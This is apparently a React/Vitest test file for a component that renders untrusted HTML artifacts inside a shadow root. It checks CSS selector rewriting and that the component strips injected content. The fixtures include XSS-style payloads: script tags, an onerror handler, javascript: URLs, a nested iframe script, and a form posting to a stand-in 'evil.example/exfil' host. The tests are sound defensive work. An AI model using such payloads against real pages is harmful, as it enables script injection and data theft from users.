import { render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import RichArtifactEmbed, { rewriteCSS } from "./RichArtifactEmbed";

const ARTIFACT_HTML = `<!doctype html><html><head>
<style>
  :root { --paper: #f5f0e8; }
  body { background: #d4cfc7; padding: 2rem; }
  .page { color: var(--paper); }
</style>
</head><body><div class="page" id="content">Page body</div></body></html>`;

describe("rewriteCSS", () => {
  it("rewrites :root to :host", () => {
    expect(rewriteCSS(":root { --x: 1; }")).toContain(":host {");
  });

  it("rewrites body selector at rule start", () => {
    expect(rewriteCSS("body { padding: 1rem; }")).toContain(".artifact-body {");
  });

  it("rewrites body in selector lists", () => {
    expect(rewriteCSS("html, body { margin: 0; }")).toContain(
      ".artifact-body, .artifact-body",
    );
  });

  it("does not touch unrelated identifiers that start with body", () => {
    // .body-of-work should not become ..artifact-body-of-work.
    const out = rewriteCSS(".body-of-work { color: red; }");
    expect(out).toBe(".body-of-work { color: red; }");
  });

  it("rewrites html selector at rule start", () => {
    expect(rewriteCSS("html { font-size: 16px; }")).toContain(
      ".artifact-body {",
    );
  });

  it("collapses html body descendant chain so common resets still match", () => {
    // Without the collapse step, `html body` would rewrite to
    // `.artifact-body .artifact-body`, which never matches (we only mount
    // one synthetic wrapper). Verify both the basic chain and the longer
    // `html body main` shape stay applicable to the artifact root.
    expect(rewriteCSS("html body { margin: 0 }")).toContain(".artifact-body {");
    expect(rewriteCSS("html body main { padding: 1rem }")).toContain(
      ".artifact-body main {",
    );
  });
});

describe("<RichArtifactEmbed>", () => {
  it("mounts the artifact in a shadow root with no iframe", async () => {
    render(<RichArtifactEmbed title="Q4 outlook" html={ARTIFACT_HTML} />);

    const host = await screen.findByLabelText("Q4 outlook", {
      selector: "rich-artifact-embed",
    });
    expect(host.closest("figure")).not.toBeNull();
    expect(document.querySelector("iframe")).toBeNull();

    // Shadow root is attached and the artifact body is reachable via the
    // synthetic .artifact-body wrapper that rewriteCSS targets.
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      expect(shadow).not.toBeNull();
      expect(shadow.querySelector(".artifact-body")).not.toBeNull();
      expect(shadow.querySelector("#content")?.textContent).toBe("Page body");
    });
  });

  it("strips script tags + on* handlers + javascript: URLs even if the server sanitiser ever lets one through", async () => {
    // Belt-and-suspenders defence-in-depth. The broker's
    // validateRichArtifactHTML should never let any of this reach us, but
    // the client-side DOMPurify layer (Layer 2 in the mountArtifact trust
    // comment) is what protects the parent origin when removing the
    // iframe boundary. If this test regresses, the parent origin is
    // exposed to an entire class of XSS bypasses.
    const adversarial = `<!doctype html><html><head>
<style>.x{color:red}</style>
</head><body>
<p id="ok">visible content</p>
<script>window.__pwned = "broker-sanitizer-bypass"</script>
<img src="x" onerror="window.__pwned2 = 'event-handler-bypass'">
<a id="badlink" href="javascript:window.__pwned3='js-url-bypass'">click</a>
<iframe srcdoc="<script>window.__pwned4='nested-iframe'</script>"></iframe>
<object data="x.swf"></object>
<form action="https://evil.example/exfil"><input name="x"></form>
</body></html>`;

    render(<RichArtifactEmbed title="Adversarial" html={adversarial} />);
    const host = await screen.findByLabelText("Adversarial", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      // Benign content survives.
      expect(shadow.querySelector("#ok")?.textContent).toBe("visible content");
      // Script-bearing constructs are gone.
      expect(shadow.querySelector("script")).toBeNull();
      expect(shadow.querySelector("iframe")).toBeNull();
      expect(shadow.querySelector("object")).toBeNull();
      expect(shadow.querySelector("form")).toBeNull();
      expect(shadow.querySelector("input")).toBeNull();
      // Event handlers are stripped.
      const img = shadow.querySelector("img");
      expect(img?.getAttribute("onerror")).toBeNull();
      // javascript: URL is removed from the anchor.
      const link = shadow.querySelector("#badlink");
      const href = link?.getAttribute("href") ?? "";
      expect(href.toLowerCase().startsWith("javascript:")).toBe(false);
    });
    // None of the pwn flags were assigned — DOMPurify swallowed the script
    // content during parse, so even the cloneNode path couldn't execute it.
    expect(
      (window as unknown as Record<string, string>).__pwned,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, string>).__pwned2,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, string>).__pwned3,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, string>).__pwned4,
    ).toBeUndefined();
  });

  it("copies <html> and <body> class/dir/lang/data-* onto the wrapper so body.dark, html[dir=rtl], body[data-theme] selectors still match", async () => {
    const html = `<!doctype html>
<html lang="en" dir="rtl">
<head><style>
  .artifact-body[dir="rtl"] { color: rgb(7, 8, 9); }
  .artifact-body.dark[data-theme="paper"] { background: rgb(1, 2, 3); }
</style></head>
<body class="dark extra" data-theme="paper" data-track="123">
<p id="ok">visible</p>
</body>
</html>`;
    render(<RichArtifactEmbed title="Wrapper attrs" html={html} />);
    const host = await screen.findByLabelText("Wrapper attrs", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      const wrap = shadow.querySelector(".artifact-body") as HTMLElement;
      expect(wrap).not.toBeNull();
      // body attrs merged.
      expect(wrap.classList.contains("dark")).toBe(true);
      expect(wrap.classList.contains("extra")).toBe(true);
      expect(wrap.classList.contains("artifact-body")).toBe(true);
      expect(wrap.getAttribute("data-theme")).toBe("paper");
      expect(wrap.getAttribute("data-track")).toBe("123");
      // html-level attrs merged.
      expect(wrap.getAttribute("dir")).toBe("rtl");
      expect(wrap.getAttribute("lang")).toBe("en");
    });
  });

  it("does not copy event handlers, style, src, or href from <body> onto the wrapper", async () => {
    // Defence-in-depth: the sanitiser drops these from elements inside
    // the body, but the wrapper-attribute copier runs over the
    // unsanitised doc head/body, so it has its own allow-list of attribute
    // names. If a future refactor weakens copyHostAttributes, this test
    // catches it.
    const html = `<!doctype html>
<html onclick="window.__html_pwned=1">
<body class="ok" onclick="window.__body_pwned=1" style="background: url(javascript:1)" src="https://evil.example/x">
<p id="ok">visible</p>
</body>
</html>`;
    render(<RichArtifactEmbed title="No bad attrs" html={html} />);
    const host = await screen.findByLabelText("No bad attrs", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      const wrap = shadow.querySelector(".artifact-body") as HTMLElement;
      expect(wrap.classList.contains("ok")).toBe(true);
      expect(wrap.getAttribute("onclick")).toBeNull();
      expect(wrap.getAttribute("style")).toBeNull();
      expect(wrap.getAttribute("src")).toBeNull();
    });
    expect(
      (window as unknown as Record<string, number>).__html_pwned,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, number>).__body_pwned,
    ).toBeUndefined();
  });

  it("re-mounts when the html prop changes", async () => {
    const { rerender } = render(
      <RichArtifactEmbed
        title="A"
        html="<!doctype html><html><body><p id='p'>one</p></body></html>"
      />,
    );
    const host = await screen.findByLabelText("A", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      expect(shadow.querySelector("#p")?.textContent).toBe("one");
    });

    rerender(
      <RichArtifactEmbed
        title="A"
        html="<!doctype html><html><body><p id='p'>two</p></body></html>"
      />,
    );
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      expect(shadow.querySelector("#p")?.textContent).toBe("two");
    });
  });
});
